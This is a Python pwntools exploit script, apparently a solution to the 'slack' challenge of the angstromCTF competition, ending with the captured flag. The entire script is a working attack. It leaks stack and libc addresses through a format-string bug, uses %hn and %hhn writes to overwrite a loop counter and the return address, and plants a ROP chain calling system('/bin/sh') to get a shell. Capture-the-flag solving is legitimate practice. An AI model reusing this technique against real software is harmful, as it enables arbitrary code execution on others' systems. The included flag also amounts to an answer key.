#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./slack_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


libc = exe.libc



def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("challs.actf.co", 31500)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.recvuntil(b'): ')
	r.sendline(b'%1$p %9$p')
	r.recvuntil(b'You: ')
	leaks = r.recvline().strip()
	stack_leak, libc_leak = leaks.split(b' ')
	success(f'{stack_leak=}')
	success(f'{libc_leak=}')

	libc.address = int(libc_leak, 16) - 0x2206a0 #(0x7f8ff5e916a0 - 0x7f8ff5c71000)
	ret_addr = int(stack_leak, 16) + 0x2198 #(0x7ffd8f295498 - 0x7ffd8f293300)
	i_addr = ret_addr - 0x70
	success(f'{libc.address=}')
	success(f'{ret_addr=}')
	success(f'{i_addr=}')

	r.recvuntil(b'): ')
	r.sendline(f'%{(i_addr + 3) & 0xffff}c%28$hn'.encode())
	r.recvuntil(b'): ')
	r.sendline(b'%255c%55$hn')

	rop = ROP(libc)
	ret = rop.find_gadget(['ret'])[0]
	pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
	bin_sh = next(libc.search(b'/bin/sh\x00'))
	system = libc.symbols.system
	chain = b''.join([
		p64(ret),
		p64(pop_rdi),
		p64(bin_sh),
		p64(system),
	])

	for i in range(len(chain)):
		payload = chain[i]
		r.recvuntil(b'): ')
		r.sendline(f'%{(ret_addr + i) & 0xffff}c%28$hn'.encode())
		line = b'%55$hhn'
		if payload:
			line = f'%{payload}c'.encode() + line
		r.recvuntil(b'): ')
		r.sendline(line)
		

	r.recvuntil(b'): ')
	r.sendline(f'%{(i_addr + 3) & 0xffff}c%28$hn'.encode())
	r.recvuntil(b'): ')
	r.sendline(b'%55$hn')

	r.interactive()


if __name__ == "__main__":
	main()

# actf{succesfu1_onb0arding_f99454d9a2f42632}
